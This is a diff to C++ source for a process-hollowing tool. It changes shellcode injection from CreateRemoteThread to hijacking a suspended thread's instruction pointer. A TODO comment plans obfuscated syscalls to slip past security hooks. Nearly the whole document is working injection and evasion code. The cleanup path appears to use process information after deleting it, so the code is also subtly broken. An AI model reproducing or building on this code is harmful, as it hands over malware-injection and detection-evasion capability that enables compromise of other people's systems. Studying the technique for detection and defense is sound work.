@@ -1,7 +1,7 @@
 // Credit: https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp
 // Credit: https://gist.github.com/benpturner/43b46506e4f98e5b860f72c3a6c42367
 
-// TODO: Use obfuscated syscalls instead of most likely hooked functions like CreateRemoteThread
+// TODO: Use obfuscated syscalls instead of most likely hooked functions like VirtualAllocEx
 
 #include "process_hallowing.h"
 #include "internal.h"
@@ -68,6 +68,32 @@ bool AllocateAndWriteMemory(HANDLE hProcess, const std::vector<BYTE> &shellcode,
     return true;
 }
 
+bool ResumeProcess(HANDLE hThread, LPVOID pAllocatedMemory, CONTEXT *context) {
+    context->ContextFlags = CONTEXT_FULL;
+    if(!GetThreadContext(hThread, context)) {
+        PRINT("failed to get thread context", PRINT_ERROR);
+        return false;
+    }
+
+#ifdef _WIN64
+    context->Rip = (DWORD64)pAllocatedMemory;
+#else
+    context->Eip = (DWORD)pAllocatedMemory;
+#endif
+
+    if (!SetThreadContext(hThread, context)) {
+        PRINT("failed to set thread context", PRINT_ERROR);
+        return false;
+    }
+
+    if (!ResumeThread(hThread)) {
+        PRINT("failed to resume thread", PRINT_ERROR);
+        return false;
+    }
+
+    return true;
+}
+
 void CreateHollowProcess(char *targetPath, const std::vector<BYTE> &shellcode) {
     if (targetPath == nullptr) {
         PRINT("target path is empty", PRINT_ERROR);
@@ -84,7 +110,7 @@ void CreateHollowProcess(char *targetPath, const std::vector<BYTE> &shellcode) {
     PPEB pPEB = nullptr;
     PLOADED_IMAGE pImage = nullptr;
     LPVOID pAllocatedMemory = nullptr;
-    HANDLE hRemoteThread = nullptr;
+    CONTEXT context = {0};
 
     if (!InitializeHollowProcess(pStartupInfo, pProcessInfo, pPEB, pImage, targetPath)) {
         goto cleanup;
@@ -98,9 +124,7 @@ void CreateHollowProcess(char *targetPath, const std::vector<BYTE> &shellcode) {
         goto cleanup;
     }
 
-    hRemoteThread = CreateRemoteThread(pProcessInfo->hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pAllocatedMemory, nullptr, 0, nullptr);
-    if (hRemoteThread == nullptr) {
-        PRINT("failed to create remote thread", PRINT_ERROR);
+    if(!ResumeProcess(pProcessInfo->hThread, pAllocatedMemory, &context)) {
         goto cleanup;
     }
 
@@ -109,6 +133,8 @@ cleanup:
         delete pStartupInfo;
     }
     if (pProcessInfo) {
+        CloseHandle(pProcessInfo->hProcess);
+        CloseHandle(pProcessInfo->hThread);
         delete pProcessInfo;
     }
     if (pPEB) {
@@ -119,8 +145,5 @@ cleanup:
     }
     if (pAllocatedMemory) {
         VirtualFreeEx(pProcessInfo->hProcess, pAllocatedMemory, 0, MEM_RELEASE);
-    }
-    if (hRemoteThread) {
-        CloseHandle(hRemoteThread);
     }
 }
